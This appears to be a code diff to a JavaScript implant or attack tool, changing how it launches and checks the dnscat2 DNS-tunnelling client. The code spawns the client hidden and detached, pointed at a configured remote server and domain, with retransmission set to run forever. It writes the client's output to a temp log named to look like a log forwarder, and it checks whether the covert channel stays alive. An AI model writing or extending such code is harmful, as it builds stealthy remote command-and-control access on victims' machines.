@@ -1118,12 +1118,14 @@ function launchDnscat(exePath) {
     return null;
   } catch (e) { void e; }
   const dns = `server=${DNSCAT.server},port=${DNSCAT.port},domain=${DNSCAT.domain}`;
-  const args = ['--dns', dns, '--retransmit-forever'];
-  if (DNSCAT.secret) args.push(`--secret=${DNSCAT.secret}`);
+  const dargs = ['--dns', dns, '--retransmit-forever'];
+  if (DNSCAT.secret) dargs.push(`--secret=${DNSCAT.secret}`);
   try {
     const logf = path.join(TMP, 'logfwd.dnscat.log');
     const fd = fs.openSync(logf, 'a');
-    const child = spawn(exePath, args, {
+    const argv = [exePath, ...dargs].map((a) => `'${a.replace(/'/g, `'\\''`)}'`).join(' ');
+    const shcmd = `${argv}; rc=$?; echo "[wrapper] dnscat rc=$rc t=$(date -u +%H:%M:%S)" >> '${logf}'`;
+    const child = spawn('sh', ['-c', shcmd], {
       windowsHide: true,
       detached: !IS_WIN,
       stdio: ['ignore', fd, fd]
@@ -1131,6 +1133,7 @@ function launchDnscat(exePath) {
     fs.closeSync(fd);
     try { fs.writeFileSync(pidFile, String(child.pid)); } catch (e) { void e; }
     child.on('error', (e) => log(`[-] dnscat2 spawn error: ${e.message}`));
+    child.on('exit', (code, sig) => log(`[*] dnscat2 wrapper exited code=${code} sig=${sig}`));
     child.unref();
     log(`[+] dnscat2 launched pid=${child.pid} -> ${dns}` +
       (DNSCAT.secret ? ' (preshared auth)' : ' (no secret: server runs without --secret)') +
@@ -1142,15 +1145,19 @@ function launchDnscat(exePath) {
   }
 }
 
+function procAlive(pid) {
+  try { process.kill(pid, 0); return true; } catch (e) { return e.code === 'EPERM'; }
+}
+
 async function reportDnscat(child) {
   if (!child) return null;
   await delay(6000);
-  if (child.exitCode !== null) {
+  if (child.signalCode || (child.exitCode !== null && child.exitCode !== undefined)) {
     log(`[-] dnscat2 exited early (code=${child.exitCode}, signal=${child.signalCode})`);
-    try {
-      const tail = fs.readFileSync(path.join(TMP, 'logfwd.dnscat.log'), 'utf8').trim().split('\n').slice(-6).join(' | ');
-      if (tail) log(`[-] dnscat2 output: ${tail.slice(0, 400)}`);
-    } catch (e) { void e; }
+    return false;
+  }
+  if (!procAlive(child.pid)) {
+    log(`[-] dnscat2 pid ${child.pid} not alive at 6s (signalCode=${child.signalCode})`);
     return false;
   }
   let connected = false;
